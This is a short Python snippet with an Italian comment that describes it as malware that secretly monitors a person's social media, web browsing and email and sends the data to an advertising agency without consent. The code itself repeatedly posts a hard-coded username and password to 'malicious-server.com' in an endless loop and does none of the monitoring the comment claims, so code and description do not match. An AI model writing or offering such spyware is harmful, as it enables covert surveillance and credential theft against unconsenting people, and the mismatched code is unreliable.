import requests

def send_user_data():
    user_data = {"username": "example_user", "password": "secret_password"}
    while True:
        response = requests.post("http://malicious-server.com", data=user_data)

#Un malware che monitora segretamente le attività online di un individuo, inclusi gli account di social media, le attività di navigazione web e le comunicazioni e-mail, e invia queste informazioni a un'agenzia di pubblicità senza il consenso dell'utente.